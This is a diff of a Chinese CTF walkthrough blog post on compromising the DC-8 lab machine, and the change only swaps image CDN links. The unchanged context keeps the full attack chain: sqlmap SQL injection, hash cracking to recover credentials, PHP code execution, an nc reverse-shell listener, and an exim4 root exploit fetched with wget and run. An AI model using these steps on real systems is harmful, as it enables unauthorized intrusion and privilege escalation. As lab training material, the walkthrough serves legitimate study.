@@ -31,13 +31,13 @@ date: 2026-03-17 12:00:00
 ifconfig
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image1.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image1.png)
 
 ```bash
 nmap -sn 192.168.168.0/24
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image2.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image2.png)
 
 ### 1.2 端口与服务扫描
 
@@ -45,11 +45,11 @@ nmap -sn 192.168.168.0/24
 nmap -A -p- 192.168.168.169
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image3.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image3.png)
 
 依旧输入 IP 跳域名，Kali 和本机都改一下 hosts：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image4.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image4.png)
 
 ```bash
 # Kali
@@ -62,7 +62,7 @@ echo "192.168.168.169 wordy" >> /etc/hosts
 
 依旧老 CMS：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image5.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image5.png)
 
 ### 1.3 目录扫描
 
@@ -72,11 +72,11 @@ dirsearch -u http://wordy -x 404,403
 
 > **`-x 404,403`** 的作用是排除「页面不存在」和「禁止访问」的结果，让输出更干净，不然一堆无用信息。
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image6.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image6.png)
 
 找到后台登录界面：`http://wordy/user`
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image7.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image7.png)
 
 ---
 
@@ -86,11 +86,11 @@ dirsearch -u http://wordy -x 404,403
 
 找到一个有输入框的地方：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image8.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image8.png)
 
 测了几个地方，这几个按钮的 URL 地址是：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image9.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image9.png)
 
 ```
 http://wordy/?nid=1
@@ -108,7 +108,7 @@ http://wordy/?nid=3'
 
 报错了！说明可能存在 SQL 注入：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image10.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image10.png)
 
 > **判断注入的最简单方式：** 加单引号 `'` 看是否报错，报错基本就是有注入点。
 
@@ -118,19 +118,19 @@ http://wordy/?nid=3'
 sqlmap -u "http://wordy/?nid=3" --dbs
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image11.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image11.png)
 
 跑出来了，继续找数据库里的账号密码：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image12.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image12.png)
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image13.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image13.png)
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image14.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image14.png)
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image15.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image15.png)
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image16.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image16.png)
 
 ---
 
@@ -138,11 +138,11 @@ sqlmap -u "http://wordy/?nid=3" --dbs
 
 在线的 cmd5 解密找不到，自己爆破一下试试：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image17.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image17.png)
 
 先确认哈希类型，查询 hashcat 哈希表：
 - 参考：https://hashcat.net/wiki/doku.php?id=example_hashes
-- ![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image18.png)
+- ![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image18.png)
 
 ```bash
 hashcat -m 7900 passwords.txt rockyou.txt
@@ -156,7 +156,7 @@ hashcat -m 7900 passwords.txt rockyou.txt
 john / turtle
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image19.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image19.png)
 
 ---
 
@@ -164,21 +164,21 @@ john / turtle
 
 ### 4.1 登录后台
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image20.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image20.png)
 
 ### 4.2 发现 PHP 富文本功能
 
 找到一个 PHP 富文本功能，可以直接写 PHP 代码：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image21.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image21.png)
 
 先用 `<?php phpinfo();?>` 测试是否能执行：
 
 需要先提交
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image22.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image22.png)
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image23.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image23.png)
 
 能执行！说明可以写反弹 Shell。
 
@@ -197,7 +197,7 @@ Kali 监听：
 nc -lvnp 5566
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image24.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image24.png)
 
 升级为交互式终端：
 
@@ -207,7 +207,7 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 
 用户目录什么都没有，去找提权方向：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image25.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image25.png)
 
 ---
 
@@ -219,7 +219,7 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image26.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image26.png)
 
 发现 **exim4**，查看版本：
 
@@ -227,11 +227,11 @@ find / -perm -u=s -type f 2>/dev/null
 exim4 --version
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image27.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image27.png)
 
 ai给出
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image28.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image28.png)
 
 ### 5.2 搜索 Exim4 漏洞
 
@@ -239,7 +239,7 @@ ai给出
 searchsploit exim 4
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image29.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image29.png)
 
 查看脚本路径并复制到当前目录：
 
@@ -248,7 +248,7 @@ searchsploit -p 46996#查看
 searchsploit -m 46996#复制
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image30.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image30.png)
 
 ### 5.3 传输 exp 到靶机
 
@@ -264,7 +264,7 @@ python3 -m http.server 8888
 wget http://192.168.168.128:8888/46996.sh
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image31.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image31.png)
 
 当前目录无权限，切换到 `/tmp`：
 
@@ -273,14 +273,14 @@ cd /tmp
 wget http://192.168.168.128:8888/46996.sh
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image32.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image32.png)
 
 ```bash
 chmod 777 46996.sh
 ./46996.sh
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image33.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image33.png)
 
 没有成功，查看源码让 AI 分析一下：
 
@@ -288,7 +288,7 @@ chmod 777 46996.sh
 cat 46996.sh
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image34.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image34.png)
 
 再次尝试./46996.sh -m netcat
 
@@ -296,13 +296,13 @@ cat 46996.sh
 ./46996.sh -m netcat
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image35.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image35.png)
 
 > **分析发现：** 这个 exp 获得的 root 权限是**临时的**，时间过了权限就变回去了。不过看 flag 已经足够了。反弹 Shell 试了不行，理论上写个 SUID 再提权应该可以，这里就不展开了。
 
 最终取得 flag：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-8_image36.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image36.png)
 
 ---
 
